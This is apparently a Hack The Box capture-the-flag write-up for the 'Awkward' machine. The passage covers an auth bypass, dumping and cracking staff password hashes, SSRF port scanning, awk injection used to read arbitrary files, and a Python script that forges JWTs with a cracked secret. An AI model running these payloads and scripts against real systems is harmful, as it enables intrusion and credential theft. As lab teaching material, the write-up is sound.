---
title: HTB: Awkward
url: https://0xdf.gitlab.io/2023/02/25/htb-awkward.html
date: 2023-02-25T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-awkward, nmap, webpack, vuejs, wfuzz, auth-bypass, jwt, jwt-io, burp, burp-repeater, hashcat, ssrf, express, api, express-api, awk, awk-injection, file-read, hashcat-jwt, python-jwt, youtube, python-requests, xpad, pspy, mail, gtfobins, pm2, command-injection
---

![Awkward](https://0xdfimages.gitlab.io/img/awkward-cover.png)

Awkward involves abusing a NodeJS API over and over again. I’ll start by bypassing the auth check, and using that to find an API where I can dump user hashes. I’ll find another API where I can get it to do a SSRF, and read internal documentation about the API. In that documentation, I’ll spot an awk injection that leads to a file disclosure vulnerability. With that, I’ll locate a backup archive and get a password from a config file that allows for SSH access. To pivot to root, I’ll abuse the website again with symlinks to have it write to a file that I can’t modify, which triggers an email being sent. I’ll write a command injection payload to get execution as root. In Beyond Root, I’ll show two unintended ways that involved getting a shell as www-data. One was patched two days after release, so I’ll show how I make the machine vulnerable again. The other is a sed parameter injection.

## Box Info

| Name | [Awkward](https://hackthebox.com/machines/awkward)  [Awkward](https://hackthebox.com/machines/awkward) [Play on HackTheBox](https://hackthebox.com/machines/awkward) |
| --- | --- |
| Release Date | [22 Oct 2022](https://twitter.com/hackthebox_eu/status/1582740868833878021) |
| Retire Date | 25 Feb 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Awkward |
| Radar Graph | Radar chart for Awkward |
| First Blood User | 00:58:12[htbas9du htbas9du](https://app.hackthebox.com/users/388108) |
| First Blood Root | 01:28:51[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [coopertim13 coopertim13](https://app.hackthebox.com/users/55851) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.185
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-14 15:12 UTC
Nmap scan report for 10.10.11.185
Host is up (0.090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds

oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.185
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-14 15:13 UTC
Nmap scan report for 10.10.11.185
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04.

### hat-valley.htb - TCP 80

#### Site

Visiting by IP address returns some JavaScript that redirects to `http://hat-valley.htb`.

The site is about hats:

[![image-20220926065647461](https://0xdfimages.gitlab.io/img/image-20220926065647461.png)](https://0xdfimages.gitlab.io/img/image-20220926065647461.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220926065647461.png)

There’s a coming soon message about an online store with a “Get Notified” button that doesn’t do anything, as well as a contact us form that also doesn’t generate any traffic.

#### Tech Stack

The HTTP headers show that the server is NGINX, and that’s proxying to [Express](https://expressjs.com/), a JavaScript web framework:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 26 Sep 2022 10:55:50 GMT
Content-Type: application/javascript; charset=UTF-8
Content-Length: 185
Connection: close
X-Powered-By: Express
Accept-Ranges: bytes
ETag: W/"b9-2n9TcRB32JpjvwTXXwWEbs4Q2aA"

```

While loading the page a `token=guest` cookie is set.

Looking at the JavaScript sources in the Firefox developer tools, there’s the typical sources under the site name, but also a “Webpack” folder:

![image-20220926073016707](https://0xdfimages.gitlab.io/img/image-20220926073016707.png)

[Webpack](https://webpack.js.org/) is a “static module bundler for modern JavaScript applications”. The `src` folder under `Webpack` has the application:

![image-20220926085938736](https://0xdfimages.gitlab.io/img/image-20220926085938736.png)

#### Source Analysis

With access to the routes here, I’ll skip the directory brute force for now.

`router.js` defines the routes for the site, including some HR functions:

![image-20220926122617087](https://0xdfimages.gitlab.io/img/image-20220926122617087.png)

Visiting any of the non-base ones redirect to `/hr`, which presents a login screen:

![image-20220926122824812](https://0xdfimages.gitlab.io/img/image-20220926122824812.png)

Later in the same file, there’s a section that applies to each request before it routes:

```

router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})

```

It’s checking for the guest cookie I noticed above and redirecting to `hr` (where there’s a login form). Otherwise, if the token isn’t “guest”, it does to `dashboard`.

There are also API endpoints defined in the `services` folder:

![image-20220926123234413](https://0xdfimages.gitlab.io/img/image-20220926123234413.png)

Though the client side source that I can see is relatively limited, only showing what data goes into an HTTP request to that endpoint. I’ll note:
- GET to `/api/all-leave` with no args;
- POST to `/api/submit-leave` with `reason`, `start`, and `end`;
- POST to `/api/login` with `username` and `password`;
- GET to `/api/staff-details` with no args;
- GET to `/api/store-status` with GET parameter `URL`

### Subdomain Fuzz

Given the use of domain names, I’ll fuzz for subdomains using `wfuzz`:

```

oxdf@hacky$ wfuzz -u http://hat-valley.htb -H "Host: FUZZ.hat-valley.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 132
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000081:   401        7 L      12 W     188 Ch      "store"

Total time: 44.77377
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 111.4268

```

It finds one, `store.hat-valley.htb`, which I’ll add to `/etc/hosts`.

### store.hat-valley.htb

This site just pops asking for auth:

![image-20220926132552070](https://0xdfimages.gitlab.io/img/image-20220926132552070.png)

It is a bit weird that a store would ask for auth, but perhaps that is because it’s not released yet.

## Shell as bean

### Site Auth as christopher.jones

#### Bypass Login

The code above seems to only check if the cookie is set to “guest” in order to redirect back to the login page. I’ll try going into Firefox dev tools -> Storage -> Cookies and deleting that cookie, and on refresh, it still loads the login form at `/hr`. Refreshing the dev tools, the cookie is back, and set to “guest”.

I’ll change the value to “0xdf”:

![image-20220926131151245](https://0xdfimages.gitlab.io/img/image-20220926131151245.png)

Now on refreshing `/hr`, it redirects to `/dashboard`:

![image-20220926131243829](https://0xdfimages.gitlab.io/img/image-20220926131243829.png)

#### Store Status

The dashboard looks a bit broken (probably failing to get data for a non-existent user cookie value). There is a “Online Store Status” button that reports on the store status. Clicking it doesn’t change anything on the site, but it does generate a request:

```

GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hat-valley.htb/dashboard
Cookie: token=0xdf
Pragma: no-cache
Cache-Control: no-cache

```

The response is just a 200 Ok with no body. I’ll want to check this for server-side request forgery and command injection vulnerabilities.

#### Leave Requests

There is another link in the lefthand sidebar for Leave Requests that goes to `/leave`:

![image-20220926132845648](https://0xdfimages.gitlab.io/img/image-20220926132845648.png)

The name and avatar as still messed up, but the form works, generating this request:

```

POST /api/submit-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 60
Origin: http://hat-valley.htb
Connection: close
Referer: http://hat-valley.htb/leave
Cookie: token=0xdf

{"reason":"hacking","start":"01/01/2023","end":"02/01/2023"}

```

The response is a 500 Internal Server Error, which shows the error message complaining about a malformed JWT (which makes sense as the value is just “0xdf” which is not a JWT):

[![image-20220926133106495](https://0xdfimages.gitlab.io/img/image-20220926133106495.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220926133106495.png)

This does leak the full path to the web application directory on the server.

#### User Data

Thus far, I’ve noted that the status endpoint seems to work with my fake cookie, but the others throw malformed JWT errors.

Playing around in Burp Repeater, I’ll discover that while the `/api/all-leave` endpoint fails with a JWT error with the cookie set as “0xdf”, if I submit without the cookie at all, it returns “Invalid user”:

![image-20220926134246612](https://0xdfimages.gitlab.io/img/image-20220926134246612.png)

Poking at the other ones, `/api/staff-details` returns a bunch of data with no cookie at all, including password hashes:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 26 Sep 2022 17:43:59 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 775
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is"

[
  {
    "user_id":1,
    "username":"christine.wool",
    "password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname":"Christine Wool",
    "role":"Founder, CEO",
    "phone":"0415202922"
  },
  {
    "user_id":2,
    "username":"christopher.jones",
    "password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname":"Christopher Jones",
    "role":"Salesperson",
    "phone":"0456980001"
  },
  {
    "user_id":3,
    "username":"jackson.lightheart",
    "password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname":"Jackson Lightheart",
    "role":"Salesperson",
    "phone":"0419444111"
  },
  {
    "user_id":4,
    "username":"bean.hill",
    "password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname":"Bean Hill",
    "role":"System Administrator",
    "phone":"0432339177"
  }
]

```

#### Crack Hashes

I’ll use `curl` and `jq` to fetch the data into a crackable format:

```

oxdf@hacky$ curl -s http://hat-valley.htb/api/staff-details | jq -r '.[] | (.username + ":" + .password)' | tee hashes
christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f

```

Running `hashcat` without giving it a hash mode (`-m`) will return that the hashes are ambiguous:

```

$ hashcat hashes --user /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...

The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

I’ll try the first one, `SHA2-256`, as that’s the most common. `hashcat` takes about 10 seconds to try all of `rockyou.txt`, cracking one of the hashes:

```

$ hashcat hashes -m 1400 --user /usr/share/wordlists/rockyou.txt 
...[snip]...
$ hashcat hashes --user -m 1400 --show
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123

```

#### Log In

I’ll generate a POST request to `/api/login` with the collected creds. I know it’s a POST from the JavaScript, as well as the parameter names. The site uses `Content-Type: application/json`, so I’ll use that format here too. It returns a JWT:

[![image-20220926140118807](https://0xdfimages.gitlab.io/img/image-20220926140118807.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220926140118807.png)

Alternatively, I can also just take those creds to the login page and login.

Now the page looks more complete:

![image-20220926140358996](https://0xdfimages.gitlab.io/img/image-20220926140358996.png)

If I add a leave request now, it works, with a message showing up at the top of the form:

![image-20221004135736307](https://0xdfimages.gitlab.io/img/image-20221004135736307.png)

The request is “sent to Christine”. That’s a hint for later.

### Access API Docs

#### SSRF POC

I noted above that there’s a likely SSRF vulnerability in the `/api/store-status` endpoint. I’ll send that request to Burp Repeater (with or without a valid token) and change the GET parameter to be my IP instead of the store domain, and send it:

![image-20220926143118794](https://0xdfimages.gitlab.io/img/image-20220926143118794.png)

There’s a hit on my Python webserver:

```
10.10.11.185 - - [26/Nov/2022 18:28:50] "GET / HTTP/1.1" 200 -

```

Not only that, but the results are shown in the body of the response:

![image-20220926143424885](https://0xdfimages.gitlab.io/img/image-20220926143424885.png)

#### Find Open Services

I’ll use `wfuzz` to look for any open ports on Awkward:

```

oxdf@hacky$ wfuzz -z range,1-65535 --hh 0 -u http://hat-valley.htb/api/store-status?url=%22http:%2F%2F127.0.0.1:FUZZ%22
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/api/store-status?url=%22http:%2F%2F127.0.0.1:FUZZ%22
Total requests: 65535

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000080:   200        8 L      13 W     132 Ch      "80"
000003002:   200        685 L    5769 W   75717 Ch    "3002"
000008080:   200        54 L     163 W    2881 Ch     "8080"

Total time: 640.0032                               
Processed Requests: 65535
Filtered Requests: 65532
Requests/sec.: 102.3979

```

Quick checks in Repeater show that 8080 is just the hats site, likely what NGINX is proxying port 80 to.

`/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:3002%22` returns a complete HTML page, which I’ll need to enumerate further..

### File Read

#### Source Analysis

The service on port 3002 is the Express documentation for the API endpoints:

[![image-20220926150608144](https://0xdfimages.gitlab.io/img/image-20220926150608144.png)](https://0xdfimages.gitlab.io/img/image-20220926150608144.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220926150608144.png)

The documentation includes the server-side source for each endpoint.

The `submit-leave` and `all-leave` endpoints jump out because they make use of the `exec` function in JavaScript. For example, the `all-leave` code:

```

app.get('/api/all-leave', (req, res) => {

  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }

  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})

```

It’s using `awk` to get the lines from `/var/www/private/leave_requests.csv` that contain the current username. For example, that syntax applied to the `hashes` file from earlier:

```

oxdf@hacky$ cat hashes 
christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f
oxdf@hacky$ awk '/chris/' hashes 
christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1

```

This would be a very obvious command injection, but the “bad character” check before the call to `awk` makes that impossible.

#### Potential File Read

I can mess around in my terminal to see how I might inject into this `exec` without using the banned characters. With access to `'`, `/`, and space, I can use this to read any file. The string is built as:

```

awk '/[user]/' /var/www/private/leave_requests.csv

```

If I let `[user]` be `/' /etc/hostname '`, that makes:

```

awk '//' /etc/hostname '/' /var/www/private/leave_requests.csv

```

From my local example, it tries to read three files, `/etc/hostname`, `/`, and `hashes`, resulting in two files and a warning:

```

oxdf@hacky$ awk '//' /etc/hostname '/' hashes 
hacky
awk: cmd. line:1: warning: command line argument `/' is a directory: skipped
christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e181

```

If I add some more junk to the end, it’ll fail on the second file and not print the original file:

```

oxdf@hacky$ awk '//' /etc/hostname '0xdf/' hashes 
hacky
awk: cmd. line:1: fatal: cannot open file `0xdf/' for reading (No such file or directory)

```

#### Crack JWT

To make any of this useful, I’ll need to be able to change the username submitted to the site, which is read from the JWT token. The signature has to validate to do that, so I’ll need the secret used to sign it. I’ll try to crack it with `hashcat`. It automatically detects it as a JWT, mode 16500, and cracks the secret to “123beany123”:

```

$ hashcat jwt /usr/share/wordlists/rockyou.txt 
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

16500 | JWT (JSON Web Token) | Network Protocol
...[snip]...
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY0MjE1MzgxfQ.9jp7Obm_6-Z3A3GyueqnbMBX26R7_qKNoLXR5JjT7Ew:123beany123
...[snip]...

```

I’ll validate it works using Python:

```

oxdf@hacky$ python3
Python 3.8.10 (default, Jun 22 2022, 20:18:18) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY0MjE1MzgxfQ.9jp7Obm_6-Z3A3GyueqnbMBX26R7_qKNoLXR5JjT7Ew'
>>> jwt.decode(token, '0xdf')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3/dist-packages/jwt/api_jwt.py", line 91, in decode
    decoded = super(PyJWT, self).decode(
  File "/usr/lib/python3/dist-packages/jwt/api_jws.py", line 155, in decode
    self._verify_signature(payload, signing_input, header, signature,
  File "/usr/lib/python3/dist-packages/jwt/api_jws.py", line 223, in _verify_signature
    raise InvalidSignatureError('Signature verification failed')
jwt.exceptions.InvalidSignatureError: Signature verification failed
>>> jwt.decode(token, '123beany123')
{'username': 'christopher.jones', 'iat': 1664215381}

```

The secret of “0xdf” causes an exception, but the secret of “123beany123” works.

#### Script

I’ll write a quick script to take a file name and fetch it in [this video](https://www.youtube.com/watch?v=j6G214-J6TE):

The final script is:

```

#!/usr/bin/env python3

import jwt
import requests
import sys

secret = "123beany123"
userdata = {"username": f"/' {sys.argv[1]} '/0xdf"}
token = jwt.encode(userdata, secret)

resp = requests.get(
    "http://hat-valley.htb/api/all-leave", cookies={"token": token.decode()}
)

if len(sys.argv) == 3 and sys.argv[2] == "DOWNLOAD":
    with open(sys.argv[1].split("/")[-1], "wb") as f:
        f.write(resp.content)

else:
    print(resp.text)

```

It works:

```

oxdf@hacky$ python read_file.py /etc/hostname
awkward

```

### Enumerating via File Read

#### Webserver

My first thought is to look for files on the webserver. I can pull the `default` NGINX config:

```

oxdf@hacky$ python read_file.py /etc/nginx/sites-enabled/default | grep -v "#" | grep .
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html;
        index index.html index.htm index.nginx-debian.html;
        server_name _;
        location / {
                try_files $uri $uri/ =404;
        }
}

```

Nothing interesting there. If I can guess the name for the store site, I can see it’s a PHP site and it’s root dir:

```

oxdf@hacky$ python read_file.py /etc/nginx/sites-enabled/store.conf | grep -v "#" | grep .
server {
    listen       80;
    server_name  store.hat-valley.htb;
    root /var/www/store;
    location / {
        index index.php index.html index.htm;
    }
    location ~ \.php$ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;
        include        fastcgi_params;
    }
}

```

Same with the main site, forwarding to 8080 as I guessed above:

```

oxdf@hacky$ python read_file.py /etc/nginx/sites-enabled/hat-valley.htb.conf | grep -v "#" | grep .
server {
    listen 80;
    server_name hat-valley.htb;
    root /var/www/hat-valley.htb;
    location / {
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}

```

I can spend some time looking around in the web files, but won’t find anything useful.

#### Users

Without finding much there, I’ll move to users who have a shell on the box:

```

oxdf@hacky$ python read_file.py /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/sh

```

I’m not able to read anything useful out of `/home/[either user]/.ssh`.

`/home/bean/.bashrc` has an interesting alias defined:

```

alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

```

I’ll read that script:

```

#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp

```

It shows that bean’s home directory is backed up to `/home/bean/Documents/backup/bean_backup_final.tar.gz` with this command.

### Backup

#### Download and Extract

I’m able to get the file :

```

oxdf@hacky$ python read_file.py /home/bean/Documents/backup/bean_backup_final.tar.gz DOWNLOAD              
oxdf@hacky$ file bean_backup_final.tar.gz
bean_backup_final.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 167772320 gzip compressed data, res
erved method, has CRC, was "", from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772320

```

Initially it came back corrupted, and I thought by adding the `DOWNLOAD` option to the file read, it might resolve that, but it is still corrupt. Still, I’m able to get a lot out of the file:

```

oxdf@hacky$ tar xf bean_backup_final.tar.gz 

gzip: stdin: unexpected end of file
tar: Child returned status 1
tar: Error is not recoverable: exiting now
oxdf@hacky$ ls
bean_backup_final.tar.gz  bean_backup.tar.gz  time.txt
oxdf@hacky$ tar xf bean_backup.tar.gz 
tar: ./snap/snapd-desktop-integration/current: Cannot create symlink to ‘14’: Operation not permitted
tar: ./.bash_history: Cannot create symlink to ‘/dev/null’: Operation not permitted
tar: ./snap/snapd-desktop-integration/14/.local/share/themes: Cannot create symlink to ‘/snap/snapd-desktop-integration/14/data-dir/themes’: Operation not permitted
tar: ./snap/snapd-desktop-integration/14/.config/gtk-3.0/bookmarks: Cannot create symlink to ‘/home/bean/.config/gtk-3.0/bookmarks’: Operation not permitted
tar: ./snap/snapd-desktop-integration/14/.config/gtk-3.0/settings.ini: Cannot create symlink to ‘/home/bean/.config/gtk-3.0/settings.ini’: Operation not permitted
tar: ./snap/snapd-desktop-integration/14/.config/gtk-2.0/gtkfilechooser.ini: Cannot create symlink to ‘/home/bean/.config/gtk-2.0/gtkfilechooser.ini’: Operation not permitted
tar: ./snap/snapd-desktop-integration/14/.config/ibus/bus: Cannot create symlink to ‘/home/bean/.config/ibus/bus’: Operation not permitted
tar: ./snap/snapd-desktop-integration/14/.config/dconf/user: Cannot create symlink to ‘/home/bean/.config/dconf/user’: Operation not permitted
tar: ./snap/snapd-desktop-integration/14/.themes: Cannot create symlink to ‘/snap/snapd-desktop-integration/14/data-dir/themes’: Operation not permitted
tar: Exiting with failure status due to previous errors
oxdf@hacky$ ls
bean_backup_final.tar.gz  bean_backup.tar.gz  Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  time.txt  Videos

```

#### xpad

`xpad` is Linux [sticky notes application](https://launchpad.net/xpad). I’ll find the data for it in `.config/xpad`:

```

oxdf@hacky$ ls -l
total 12
-rwxrwx--- 1 root vboxsf 433 Sep 15 11:42 content-DS1ZS1
-rwxrwx--- 1 root vboxsf 449 Sep 15 11:41 default-style
-rwxrwx--- 1 root vboxsf 153 Sep 15 11:42 info-GQ1ZS1

```

The content of the notes is in the `content` file:

```

oxdf@hacky$ cat content-DS1ZS1 
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slack.stanford.edu/slack/www/resource/how-to-use/cgi-rexx/cgi-esc.html

```

There’s a todo list, as well as a potential password.

#### SSH

That password works as SSH:

```

oxdf@hacky$ sshpass -p '014mrbeanrules!#P' ssh bean@hat-valley.htb
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-47-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

41 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Sep 26 23:56:43 2022 from 10.10.14.6
bean@awkward:~$

```

I can grab the flag:

```

bean@awkward:~$ cat user.txt
4ce15a8e************************

```

## Shell as root

### Enumeration

#### HomeDir

There’s nothing much of interest in bean’s home directory. There’s one more directory, christine:

```

bean@awkward:/home$ ls
bean  christine
bean@awkward:/home$ ls -la christine/
total 20
drwxr-xr-x 2 christine christine 4096 Sep 15 21:39 .
drwxr-xr-x 4 root      root      4096 Oct  5 02:46 ..
-rw-r--r-- 1 christine christine  220 Sep 15 21:39 .bash_logout
-rw-r--r-- 1 christine christine 3771 Sep 15 21:39 .bashrc
-rw-r--r-- 1 christine christine  807 Sep 15 21:39 .profile

```

#### Web

`/var/www` has four folders in it:

```

bean@awkward:/var/www$ ls
hat-valley.htb  html  private  store

```

`hat-valley.htb` is the main store site. `html` is just the `index.html` that redirects to `hat-velley.htb`. `store` is the store site.

`private` is interesting. It’s owned by christine and accessible by www-data, but not bean:

```

bean@awkward:/var/www$ ls -ld private/
dr-xr-x--- 2 christine www-data 4096 Sep 15 22:30 private/

```

I’ll remember before that it was this folder that `leave_requests.csv` is located in.

With access to `store`, I can figure out how the site is protected. There’s no `.htaccess` file in the folder:

```

bean@awkward:/var/www/store$ ls -la
total 104
drwxr-xr-x 9 root root  4096 Sep 15 23:13 .
drwxr-xr-x 6 root root  4096 Sep 15 22:41 ..
drwxrwxrwx 2 root root  4096 Sep 15 23:05 cart
-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
drwxr-xr-x 2 root root  4096 Sep 15 20:09 css
drwxr-xr-x 2 root root  4096 Sep 15 20:09 fonts
drwxr-xr-x 6 root root  4096 Sep 15 20:09 img
-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
drwxr-xr-x 3 root root  4096 Sep 15 20:09 js
drwxrwxrwx 2 root root  4096 Oct  5 05:00 product-details
-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
drwxr-xr-x 6 root root  4096 Sep 15 20:09 static
-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css

```

The config file from NGINX shows that the `auth_basic` is set to “Restricted” and the `auth_basic_user_file` is `/etc/nginx/conf.d/.htpasswd`.

That file contains a hash for admin:

```

bean@awkward:/etc/nginx/sites-enabled$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1

```

This doesn’t crack in `hashcat` with `rockyou.txt`, but it does crack with bean’s password:

```

$ echo '014mrbeanrules!#P' > pass
$ hashcat htpass pass --user
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server
...[snip]...
$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1:014mrbeanrules!#P   
...[snip]...
$ hashcat htpass --user --show
...[snip]...
